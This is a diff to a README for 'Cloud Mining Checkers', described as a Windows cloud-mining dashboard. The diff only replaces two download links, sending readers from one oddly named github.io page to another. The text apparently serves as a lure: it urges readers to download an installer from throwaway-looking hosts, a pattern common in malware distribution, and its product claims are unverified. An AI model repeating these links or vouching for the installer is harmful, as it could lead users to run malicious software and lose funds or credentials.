@@ -2,7 +2,7 @@
 
 Cloud Mining Checkers is a feature-rich Windows desktop application designed to simplify cloud mining management for users in 2026. This tool integrates seamlessly with popular mining pools and provides a centralized dashboard for monitoring hashrate, earnings, and account activities. By leveraging advanced analytics, Cloud Mining Checkers helps you optimize your mining strategy and increase profitability.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -63,7 +63,7 @@ A: Updates are released periodically to add new features and improve stability. 
 
 Access the latest version of Cloud Mining Checkers via the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Version History
 
